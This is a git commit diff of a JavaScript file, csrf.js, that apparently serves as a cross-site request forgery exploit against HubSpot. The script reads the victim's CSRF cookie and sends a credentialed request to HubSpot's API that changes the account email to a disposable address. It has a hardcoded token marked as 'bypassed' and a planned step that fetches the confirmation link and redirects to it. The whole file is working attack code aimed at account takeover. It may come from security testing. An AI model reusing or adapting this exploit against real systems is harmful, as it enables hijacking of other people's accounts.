a32ddd8a5851d2f2e70d88186e34970cd69b8b91
Mohamed Mahmoudi <41636967+medmahmoudi26@users.noreply.github.com>
2022-02-10 00:58:50 +0100

    Update csrf.js

--- assets/javascript/csrf.js
+++ assets/javascript/csrf.js
@@ -7,16 +7,21 @@ function getCookie(cookieName) {
   return cookie[cookieName];
 }
 
-var csrf = getCookie("hubspotapi-csrf")
+var csrf = getCookie("hubspotapi-csrf") // extracting csrf token
 
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https:\/\/api-eu1.hubspot.com\/userpreferences\/v1\/emailAddresses\/edit\/vogabod888@host1s.com?portalId=25502480&clienttimeout=14000&hs_static_app=settings-ui-security&hs_static_app_version=1.3229", true);
+xhr.open("POST", "https:\/\/api-eu1.hubspot.com\/userpreferences\/v1\/emailAddresses\/edit\/ravir57140@porjoton.com?portalId=25502480&clienttimeout=14000&hs_static_app=settings-ui-security&hs_static_app_version=1.3229", true);
 xhr.setRequestHeader("accept", "application\/json, text\/javascript, *\/*; q=0.01");
 xhr.setRequestHeader("accept-language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
-xhr.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", "B6C1X6mjRirkYRvyU8N_xg")
+xhr.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", "B6C1X6mjRirkYRvyU8N_xg") // csrf token bypassed
 xhr.withCredentials = true;
 var body = "";
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
       aBody[i] = body.charCodeAt(i); 
 xhr.send(new Blob([aBody]));
+
+// function to get the link from my email
+
+
+// window.location = "confirmation link"
